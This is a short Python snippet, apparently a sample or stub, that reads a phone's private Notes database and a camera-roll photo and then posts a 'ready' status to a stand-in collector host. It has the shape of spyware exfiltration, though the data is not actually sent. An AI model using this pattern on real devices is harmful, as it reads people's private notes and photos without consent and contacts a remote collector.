import requests
notes = open('/private/var/mobile/Library/Notes/notes.sqlite', 'rb').read()
photo = open('/var/mobile/Media/DCIM/100APPLE/IMG_0012.JPG', 'rb').read()
requests.post('https://collector.invalid/status', data='ready')
